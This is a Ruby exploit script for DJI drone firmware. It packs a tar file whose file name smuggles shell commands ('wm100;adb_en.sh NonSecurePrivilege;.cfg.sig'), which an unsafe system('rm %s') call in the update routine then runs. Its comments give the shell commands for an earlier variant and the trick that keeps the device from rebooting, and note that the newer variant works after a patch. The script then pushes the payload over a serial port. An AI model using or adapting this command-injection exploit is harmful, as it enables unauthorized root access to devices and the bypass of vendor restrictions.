#!/usr/bin/env ruby
# TarAndFeather.rb
# by Hostile@Me.com in proxy via jan2642
#
# July 21st - got another exploit (on mavic .700 at least) ! (Thanks to @the_lord for the duml capture) @jan2642 via Slack
# Create a data_copy.bin tar file containing a single 0-byte file called ";adb_en.sh NonSecurePrivilege;sleep 3600;nfz.db" (without the quotes)
# It's specific to the nfz.db update so it won't work on all versions
# No idea why they would do system("rm %s") when there's a C unlink() function??
# touch \;adb_en.sh\ NonSecurePrivilege\;sleep\ 3600\;nfz.db 
# tar cvf data_copy.bin \;adb_en.sh\ NonSecurePrivilege\;sleep\ 3600\;nfz.db
# the sleep 3600 is needed to prevent dji_sys from invoking reboot after the failed update
#
# Variant discovered July 27th after original RedHerring was patched in latest Spark firmware V 01.00.0500 
# https://forum.dji.com/thread-106245-1-1.html
# 
# Instead of data_copy.bin and the NFZ update DUML request, we can use dji_system.bin and the system update DUML request. 
# No additional sleep is required.

require 'zlib'
require 'archive/tar/minitar'
include Archive::Tar
$:.unshift File.expand_path('..',__dir__)
require "RubaDubDUML.rb"

exploit = PwnSauce.new

#pwnt = ";adb_en.sh NonSecurePrivilege;sleep 3600;nfz.db"
pwnt = "wm100;adb_en.sh NonSecurePrivilege;.cfg.sig"

File.open(pwnt, 'w') {|f| f.write("Burning 0day!!") }
File.open('dji_system.bin', 'wb') { |tar| 
    puts "One does not simply tar, and feather the new guy..."    
    Minitar.pack(pwnt, tar) 
    File.unlink(pwnt)
}

exploit.pwn("/dev/tty.usbmodem1445", "dji_system.bin", "")
